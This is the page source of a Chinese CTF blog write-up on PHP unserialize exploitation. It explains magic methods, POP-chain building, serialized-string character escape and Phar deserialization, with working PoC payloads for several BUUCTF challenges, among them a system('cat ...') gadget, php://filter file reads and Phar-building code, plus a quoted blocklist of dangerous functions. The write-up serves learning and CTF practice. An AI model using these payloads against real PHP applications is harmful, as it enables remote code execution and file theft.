+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-123-45','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<meta property="og:title" content="PHP 反序列化">
+<meta property="og:description" content="基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://shenyiming.life/post/ctf/unserialize/php/"><meta property="og:image" content="https://shenyiming.life/android-chrome-512x512.png"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2022-06-11T00:00:00+00:00">
+<meta property="article:modified_time" content="2022-07-08T00:00:00+00:00"><meta property="og:site_name" content="Yiming">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://shenyiming.life/android-chrome-512x512.png">
+<meta name=twitter:title content="PHP 反序列化">
+<meta name=twitter:description content="基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"文章","item":"https://shenyiming.life/post/"},{"@type":"ListItem","position":3,"name":"🏁CTF","item":"https://shenyiming.life/post/ctf/"},{"@type":"ListItem","position":4,"name":"Unserialize","item":"https://shenyiming.life/post/ctf/unserialize/"},{"@type":"ListItem","position":5,"name":"PHP 反序列化","item":"https://shenyiming.life/post/ctf/unserialize/php/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PHP 反序列化","name":"PHP 反序列化","description":"基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria","keywords":["CTF","PHP","Web","Note"],"articleBody":"基础知识  常见PHP魔术函数  __construct() //当一个对象创建时被调用  __destruct() //当一个对象销毁时被调用  __wakeup() //使用unserialize时触发  __sleep() //使用serialize时触发  __destruct() //对象被销毁时触发  __call() //在对象上下文中调用不可访问的方法时触发  __get() //用于从不可访问的属性读取数据  __set() //用于将数据写入不可访问的属性  __toString() //把类当作字符串使用时触发  __invoke() //当脚本尝试将对象调用为函数时触发  审POP链的过程，需要熟练掌握魔术函数。\n 掌握面向对象概念以及PHP中的类与对象  序列化与反序列化  序列化：把对象转换为字节序列的过程，便于存储或传输。\n反序列化：把字节序列恢复为对象的过程。\n 漏洞可能出现的位置 1.解析认证token、session的位置\n2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等\n3.将对象序列化后在网络中传输，如传输json数据，xml数据等\n4.参数传递给程序\n5.使用RMI协议，被广泛使用的RMI协议完全基于序列化\n6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等\n7.定义协议用来接收与发送原始的java对象\n原理 在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。\n序列化后的对象字符串 O:1:\"A\":1:{s:7:\"%00A%00name\";s:6:\"As1def\";} // O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。 // 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。 // s代表string类型 // 另外还有b=bool i=int d=double a=array r=对象引用 R= 指针引用 N=NULL;  // 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。 POP链构造  POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。\n 即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。\n实例 php //flag is in flag.php error_reporting(1); class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } public function __invoke(){ $content = $this-file_get($this-var); echo $content; } } class Show { public $source; public $str; public function __construct($file='index.php') { $this-source = $file; echo $this-source.'Welcome'.\"\n\"; } public function __toString() { return $this-str['str']-source; } public function _show() { if(preg_match('/gopher|http|ftp|https|dict|\\.\\.|flag|file/i',$this-source)) { die('hacker'); } else { highlight_file($this-source); } } public function __wakeup() { if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-source)) { echo \"hacker\"; $this-source = \"index.php\"; } } } class Test { public $p; public function __construct() { $this-p = array(); } public function __get($key) { $function = $this-p; return $function(); } } if(isset($_GET['hello'])) { unserialize($_GET['hello']); } else { $show = new Show('pop3.php'); $show-_show(); } 分析思路  先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（__invoke）时可读取文件。 可控的是get传入的hello参数，将hello值反序列化，此时会调用__wakeup方法，只有Show类中存在该方法。\\_\\_wakeup方法中会对$this-source进行正则匹配，此时会将source的内容当作字符串处理，即调用__toString()方法。 __toString方法中读取了$this-str['str']-source，如果str['str']对象中没有source这个变量呢？此时就会调用__get魔术方法（如果该对象存在这个方法的话）。 观察程序，发现只有Test类有__get方法，用Test类继续构造POP链，会调用$this-p变量，并将$this-p作为函数执行，此时就来到了我们找到的利用点——Read类中的__invoke魔术方法！  如此，我们构造好了一条POP链：\n$_GET['hello']-Show.__wakeup-Show.__toString-Test.__get-Read.__invoke-Read.file_get-读取任意文件\n得到POC\nphp class Read{ public $var = \"flag.php\"; } class Show{ public $source; public $str; } class Test{ public $p; } $read = new Read(); $show = new Show(); $test = new Test(); $show-str['str']=$test; $test-p=$read; echo serialize($show); echo ' '; $show-source=$show; //这个地方是为了触发Show类中的__toString方法，因为正则判断是对source进行字符串化  echo serialize($show); ?总结  先观察是否存在利用点  可执行命令、文件包含的敏感函数 参数可控的变量、入口   注意所有魔术方法 将魔术方法执行顺序连成一条链 确定对象调用顺序，填入对象变量参数，构造POP链  题目 [[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz) php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-process(); } public function process() { if($this-op == \"1\") { $this-write(); } else if($this-op == \"2\") { $res = $this-read(); $this-output($res); } else { $this-output(\"Bad Hacker!\"); } } private function write() { if(isset($this-filename) \u0026\u0026 isset($this-content)) { if(strlen((string)$this-content)  100) { $this-output(\"Too long!\"); die(); } $res = file_put_contents($this-filename, $this-content); if($res) $this-output(\"Successful!\"); else $this-output(\"Failed!\"); } else { $this-output(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-filename)) { $res = file_get_contents($this-filename); } return $res; } private function output($s) { echo \"[Result]: \"; echo $s; } function __destruct() { if($this-op === \"2\") $this-op = \"1\"; $this-content = \"\"; $this-process(); } } function is_valid($s) { for($i = 0; $i  strlen($s); $i++) if(!(ord($s[$i]) = 32 \u0026\u0026 ord($s[$i])  125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 观察发现，有反序列化入口，为传入的get参数$str\n会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有\\x00*\\x00标识，而\\x00的ASCII码值为0，不符合条件。\n利用PHP特性绕过反序列化限制  PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。 可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本  PHP 弱类型绕过 类中有一个析构函数__destruct，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。\n注意到析构函数中判断使用的是强类型相等===，而process类中的判断时弱类型相等==，可以利用PHP语言特性绕过：\"2\"==2,2!===\"2\"\n令$op=2而不是\"2\"即可\n构造POC php use FileHandler as GlobalFileHandler; class FileHandler{ public $op=2; public $filename=\"flag.php\"; public $content; } $fileHandler = new FileHandler(); echo serialize($fileHandler); ?得到\nO:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;} \n执行查看源代码即得到Flag。\n[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb) 进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是call_user_func方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。\n直接highlight_file读取本页面源码，得到：\nphp // phpweb poc  $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") { return $result; } else {return \"\";} } class Test { var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() { if ($this-func != \"\") { echo gettime($this-func, $this-p); } } } $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\"Hacker...\"); } } ?无过滤，直来直去，直接构造POC\nphp class Test{ // var $p = \"find / -name flag*\"; 先查一下服务器中含有flag的文件名，找到位置  var $p = \"cat /tmp/flagoefiu4r93\"; var $func = \"system\"; } $test = new Test (); echo urlencode(serialize($test)); ?[安洵杯 2019] easy_serialize_php php // d0g3_f1ag.php $function = @$_GET['f']; function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST); if(!$function){ echo 'source_code'; } if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION)); if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); }  先查看phpinfo，发现敏感文件泄露：d0g3_f1ag.php，即使用file_get_contents读该文件 存在过滤，以及使用sha1函数替换了用户传入的img_path，sha1和base64应该是不太可能碰撞的，考虑绕过过滤。 过滤方式是简单替换为空，存在绕过的可能。  知识点   本题的$_SESSION其实并不是PHP的自带变量，而是用户定义的变量，我们在extract($_POST)这里通过POST方式控制其内容。\n  不是只有类和对象才有序列化和反序列化，类、对象、数组、变量均可进行序列化。\na - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string   PHP进行反序列化时，并不要求字符串严格按照格式，而是按照从左至右的顺序和预先安排的字符个数进行依次读取。\n故而在未遇到字符串尾：;和读满字符个数之前，会将遇到的所有字符当作相应的对象名或内容。\n  PHP 反序列化字符逃逸  字符逃逸的本质即为闭合。分为两种情况，一是字符变多，二是字符变少。\n 本题存在过滤后字符变少的情况。\n由于程序会将$_SESSION['img']设置为固定值，我们要控制改变这里的值，需要让程序错位读取我们设置的值。\n  我们希望的img序列化结果(读取base64编码后的d0g3_f1ag.php)：\ns:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";\n  我们可以在程序反序列化时，添加一个新的数组元素，覆盖掉原有的img元素，类似于SQL注入\n$_SESSION['xx']='\";s:3:\"abc\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}'\n  $_SESSION序列化后：\n a:1:{s:2:\"xx\";s:51:\"\";s:3:\"aaa\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";}\n  此时数一下多余的字符数：;s:51:\"\"为8个，可用flagflag拼凑\n   a:1:{s:8:\"flagflag\";s:51:\"\";s:3:\"aaa\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";}\n  被过滤后，变成了： a:1:{s:8:\"\";s:51:\"\";s:3:\"aaa\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";}，此时，原先多余的八个字符正好会被当作第一个元素的名字，而s:3:\"aaa\"即为它的值，而后面的img参数能被正常解析成功！\n  Payload\nPOST： $_SESSION['flagflag']=\";s:3:\"abc\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\n(去掉两个单引号是因为http协议中的post请求无需用引号覆盖，而PHP的字符串内容需要单引号)\n[MRCTF2020]Ezpop 本题与POP链构造的实例相同，需要注意的是最后的文件读取用的是文件包含include的函数，故而需要用到文件包含的php://filter伪协议。\nPOC\nphp class Modifier{ protected $var='php://filter/convert.base64-encode/resource=flag.php'; } class Show{ public $source; public $str; public function __construct($file='flag.php'){ $this-source = $file; // echo 'Welcome to '.$this-source.\"\n\";  } } class Test{ public $p; } $modifier = new Modifier(); $show = new Show(); $test = new Test(); $test-p = $modifier; $show-str = $test; $show-source = $show; echo urlencode(serialize($show)); ?[SWPUCTF 2018]SimplePHP 本题考察知识点为\n 文件包含 利用Phar进行反序列化  进入题目，发现存在一个文件包含和一个文件上传点，先利用文件包含读取file.php和upload_file.php的源代码，发现文件上传过滤严格，似乎不存在可以绕过的漏洞，只能上传图片格式。而file.php中还包含了function.php和class.php，第一个提示flag在f1ag.php中，第二个则明显是要进行POP链的构造。\nclass.php内容\nphp class C1e4r { public $test; public $str; public function __construct($name) { $this-str = $name; } public function __destruct() { $this-test = $this-str; echo $this-test; } } class Show { public $source; public $str; public function __construct($file) { $this-source = $file; //$this-source = phar://phar.jpg  echo $this-source; } public function __toString() { $content = $this-str['str']-source; return $content; } public function __set($key,$value) { // 在给不可访问（protected 或 private）或不存在的属性赋值时 调用Set  $this-$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-source)) { die('hacker!'); } else { highlight_file($this-source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-source)) { echo \"hacker~\"; $this-source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-params = array(); } public function __get($key) { return $this-get($key); } public function get($key) { if(isset($this-params[$key])) { $value = $this-params[$key]; } else { $value = \"index.php\"; } return $this-file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?标注出所有魔术方法后，可以找到如下的POP链：\nC1e4r.__destruct-Show.__set-Show.__toString-Test.params[$key]-Test.file_get\n即可构造POP链\nphp class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $c1e4r = new C1e4r(); $show = new Show(); $test = new Test(); $c1e4r-str = $show; $show-str['str'] = $test; $test-params['source'] = 'f1ag.php'; ?但是，反序列化入口在哪里？所有的源代码中都没有反序列化函数unserialize\nPhar反序列化 这时候，就要利用隐藏的反序列化入口-Phar://\n Phar方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作。\n PHP大部分的文件系统函数在通过phar://伪协议解析phar包文件时，都会将文件结构中meta-data的部分进行反序列化。\n同时， phar 文件必须以__HALT_COMPILER();?来结尾，那么可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。\n生成Phar包文件的代码是固定的：\n$phar = new Phar(\"exp.phar\"); //生成.phar文件，此处填写的后缀名必须是.phar，但phar://协议不限于只解析.phar文件 $phar-startBuffering(); $phar-setStub(''); //固定的，可以在此处添加伪造的文件头 $phar-setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象，此处即为对$c1e4r进行序列化的操作 $phar-addFromString(\"exp.txt\", \"test\"); //随便写，生成签名 $phar-stopBuffering(); 完成后便会生成在同目录下生成一个exp.phar文件，手动修改文件拓展名为.jpg（之前查看upload_file.php源代码发现没有检查文件头，故更改文件后缀即可），上传，找到位置，在文件包含处使用phar://协议包含该jpg文件，即可通过POP链读取flag文件。\nPhar反序列化的条件 根据该题，可以总结出需要满足以下三个条件：\n 需要存在POP链，末端可以获得flag的方法 需要文件上传入口，上传phar包 需要文件包含，利用phar://伪协议读取phar包  除此之外，Postgresql和Mysql中也都有函数可以利用phar://伪协议进行反序列化操作。\n参考  PHP反序列化和POP链构造 - As1def’s Blog 一题教你学会构造PHP反序列化POP链 - FreeBuf BUUCTF刷题——PHP反序列化 - CA01H' Blog PHP 反序列化字符逃逸 - 先知社区 PHP反序列化拓展攻击Phar详解 - 先知社区  ","wordCount":"5251","inLanguage":"en","datePublished":"2022-06-11T00:00:00Z","dateModified":"2022-07-08T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shenyiming.life/post/ctf/unserialize/php/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shenyiming.life/favicon.ico"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<noscript>
+<style type=text/css>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://shenyiming.life accesskey=h title="相位  (Alt + H)">
+<img src=/favicon.ico alt=logo aria-label=logo height=35>相位 </a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu onscroll=menu_on_scroll()>
+<li>
+<a href=https://shenyiming.life/post/ title=文章>
+<span>文章</span>
+</a>
+</li>
+<li>
+<a href=https://shenyiming.life/archive/ title=归档>
+<span>归档</span>
+</a>
+</li>
+<li>
+<a href=https://shenyiming.life/categories/ title=分类>
+<span>分类</span>
+</a>
+</li>
+<li>
+<a href=https://shenyiming.life/tags/ title=标签>
+<span>标签</span>
+</a>
+</li>
+<li>
+<a href=https://shenyiming.life/search/ title="搜索 (Alt + /)" accesskey=/>
+<span>搜索</span>
+</a>
+</li>
+<li>
+<a href=https://shenyiming.life/friends/ title=友链>
+<span>友链</span>
+</a>
+</li>
+<li>
+<a href=https://shenyiming.life/about/ title=关于>
+<span>关于</span>
+</a>
+</li></ul>
+</nav>
+</header>
+<main class=main>
+<style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs>
+<a href=https://shenyiming.life>首页</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/>文章</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/ctf/>🏁CTF</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/ctf/unserialize/>Unserialize</a>
+</div>
+<h1 class=post-title>
+PHP 反序列化
+</h1>
+<div class=post-meta>
+<style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+June 11, 2022&nbsp;·&nbsp;July 8, 2022&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Yiming Shen
+|&nbsp;<a href=https://github.com/shenyimings/shenyimings.github.io/tree/main/docs rel="noopener noreferrer" target=_blank>Issue</a>
+</div>
+</header>
+<aside id=toc-container class="toc-container wide">
+<div class=toc>
+<details open>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>目录</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86 aria-label=基础知识>基础知识</a></li>
+<li>
+<a href=#%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8e%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=序列化与反序列化>序列化与反序列化</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%8f%af%e8%83%bd%e5%87%ba%e7%8e%b0%e7%9a%84%e4%bd%8d%e7%bd%ae aria-label=漏洞可能出现的位置>漏洞可能出现的位置</a></li>
+<li>
+<a href=#%e5%8e%9f%e7%90%86 aria-label=原理>原理</a></li>
+<li>
+<a href=#%e5%ba%8f%e5%88%97%e5%8c%96%e5%90%8e%e7%9a%84%e5%af%b9%e8%b1%a1%e5%ad%97%e7%ac%a6%e4%b8%b2 aria-label=序列化后的对象字符串>序列化后的对象字符串</a></li></ul>
+</li>
+<li>
+<a href=#pop%e9%93%be%e6%9e%84%e9%80%a0 aria-label=POP链构造>POP链构造</a><ul>
+<li>
+<a href=#%e5%ae%9e%e4%be%8b aria-label=实例>实例</a><ul>
+<li>
+<a href=#%e5%88%86%e6%9e%90%e6%80%9d%e8%b7%af aria-label=分析思路>分析思路</a></li>
+<li>
+<a href=#%e6%80%bb%e7%bb%93 aria-label=总结>总结</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#%e9%a2%98%e7%9b%ae aria-label=题目>题目</a><ul>
+<li>
+<a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialzhttpsbuuojcnchallenges%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz aria-label="[[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)">[[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)</a><ul>
+<li>
+<a href=#%e5%88%a9%e7%94%a8php%e7%89%b9%e6%80%a7%e7%bb%95%e8%bf%87%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e9%99%90%e5%88%b6 aria-label=利用PHP特性绕过反序列化限制><strong>利用PHP特性绕过反序列化限制</strong></a></li>
+<li>
+<a href=#php-%e5%bc%b1%e7%b1%bb%e5%9e%8b%e7%bb%95%e8%bf%87 aria-label="PHP 弱类型绕过">PHP 弱类型绕过</a></li>
+<li>
+<a href=#%e6%9e%84%e9%80%a0poc aria-label=构造POC>构造POC</a></li></ul>
+</li>
+<li>
+<a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpwebhttpsbuuojcnchallenges%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpweb aria-label="[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)">[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)</a></li>
+<li>
+<a href=#%e5%ae%89%e6%b4%b5%e6%9d%af-2019-easy_serialize_php aria-label="[安洵杯 2019] easy_serialize_php">[安洵杯 2019] easy_serialize_php</a><ul>
+<li>
+<a href=#%e7%9f%a5%e8%af%86%e7%82%b9 aria-label=知识点>知识点</a></li>
+<li>
+<a href=#php-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8 aria-label="PHP 反序列化字符逃逸">PHP 反序列化字符逃逸</a></li></ul>
+</li>
+<li>
+<a href=#mrctf2020ezpop aria-label=[MRCTF2020]Ezpop>[MRCTF2020]Ezpop</a></li>
+<li>
+<a href=#swpuctf-2018simplephp aria-label="[SWPUCTF 2018]SimplePHP">[SWPUCTF 2018]SimplePHP</a><ul>
+<li>
+<a href=#phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=Phar反序列化>Phar反序列化</a></li>
+<li>
+<a href=#phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%9d%a1%e4%bb%b6 aria-label=Phar反序列化的条件>Phar反序列化的条件</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#%e5%8f%82%e8%80%83 aria-label=参考>参考</a>
+</li>
+</ul>
+</div>
+</details>
+</div>
+</aside>
+<script>let activeElement,elements;window.addEventListener('DOMContentLoaded',function(b){checkTocPosition(),elements=document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]'),activeElement=elements[0];const a=encodeURI(activeElement.getAttribute('id')).toLowerCase();document.querySelector(`.inner ul li a[href="#${a}"]`).classList.add('active')},!1),window.addEventListener('resize',function(a){checkTocPosition()},!1),window.addEventListener('scroll',()=>{activeElement=Array.from(elements).find(a=>{if(getOffsetTop(a)-window.pageYOffset>0&&getOffsetTop(a)-window.pageYOffset<window.innerHeight/2)return a})||activeElement,elements.forEach(a=>{const b=encodeURI(a.getAttribute('id')).toLowerCase();a===activeElement?document.querySelector(`.inner ul li a[href="#${b}"]`).classList.add('active'):document.querySelector(`.inner ul li a[href="#${b}"]`).classList.remove('active')})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue('--gap'),10);function checkTocPosition(){const a=document.body.scrollWidth;a-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(a){if(!a.getClientRects().length)return 0;let b=a.getBoundingClientRect(),c=a.ownerDocument.defaultView;return b.top+c.pageYOffset}</script>
+<div class=post-content>
+<h2 id=基础知识>基础知识<a hidden class=anchor aria-hidden=true href=#基础知识>#</a></h2>
+<ol>
+<li>常见PHP魔术函数</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>__construct</span>() <span style=color:#75715e>//当一个对象创建时被调用
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__destruct</span>() <span style=color:#75715e>//当一个对象销毁时被调用
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__wakeup</span>() <span style=color:#75715e>//使用unserialize时触发
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__sleep</span>() <span style=color:#75715e>//使用serialize时触发
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__destruct</span>() <span style=color:#75715e>//对象被销毁时触发
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__call</span>() <span style=color:#75715e>//在对象上下文中调用不可访问的方法时触发
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__get</span>() <span style=color:#75715e>//用于从不可访问的属性读取数据
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__set</span>() <span style=color:#75715e>//用于将数据写入不可访问的属性
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__toString</span>() <span style=color:#75715e>//把类当作字符串使用时触发
+</span><span style=color:#75715e></span>
+<span style=color:#a6e22e>__invoke</span>() <span style=color:#75715e>//当脚本尝试将对象调用为函数时触发
+</span></code></pre></div><blockquote>
+<p>审POP链的过程，需要熟练掌握魔术函数。</p>
+</blockquote>
+<ol start=2>
+<li>掌握面向对象概念以及PHP中的类与对象</li>
+</ol>
+<h2 id=序列化与反序列化>序列化与反序列化<a hidden class=anchor aria-hidden=true href=#序列化与反序列化>#</a></h2>
+<blockquote>
+<p><strong>序列化</strong>：把对象转换为字节序列的过程，便于存储或传输。</p>
